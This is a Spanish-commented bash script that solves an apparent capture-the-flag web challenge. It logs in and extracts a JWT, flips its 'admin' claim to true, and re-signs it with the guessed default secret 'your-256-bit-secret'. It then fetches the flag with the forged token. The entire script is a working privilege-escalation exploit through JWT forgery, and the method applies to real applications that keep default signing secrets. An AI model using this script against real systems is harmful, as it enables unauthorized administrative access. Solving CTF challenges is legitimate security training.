#!/bin/bash

BASE_URL="http://litctf.org:31781"
REGISTER_URL="$BASE_URL/signup/"
LOGIN_URL="$BASE_URL/login/"
FLAG_URL="$BASE_URL/flag"

USERNAME="cu3nt4r4nd0mm"
PASSWORD="hola1234"

# Registrar usuario
#curl -s -X POST "$REGISTER_URL" -d "username=$USERNAME&password=$PASSWORD"

# Iniciar sesion
RESPONSE=$(curl -s -c cookies.txt -X POST "$LOGIN_URL" -d "username=$USERNAME&password=$PASSWORD")

# Extraigo el token y cambio el payload para poner admin=true
TOKEN=$(grep 'token' cookies.txt | awk '{print $7}')

HEADER=$(echo "$TOKEN" | cut -d '.' -f 1)
PAYLOAD=$(echo "$TOKEN" | cut -d '.' -f 2)
SIGNATURE=$(echo "$TOKEN" | cut -d '.' -f 3)

DECODED_PAYLOAD=$(echo "$PAYLOAD" | base64 --decode)
MODIFIED_PAYLOAD=$(echo "$DECODED_PAYLOAD" | sed 's/"admin":false/"admin":true/')
NEW_PAYLOAD=$(echo -n "$MODIFIED_PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')

# Cambio el secret
SECRET="your-256-bit-secret"
NEW_SIGNATURE=$(echo -n "$HEADER.$NEW_PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr '+/' '-_' | tr -d '=')

NEW_TOKEN="$HEADER.$NEW_PAYLOAD.$NEW_SIGNATURE"

echo -e "token=$NEW_TOKEN" > cookies.txt

# Flag
FLAG_RESPONSE=$(curl -s -b "token=$NEW_TOKEN" "$FLAG_URL")
echo $FLAG_RESPONSE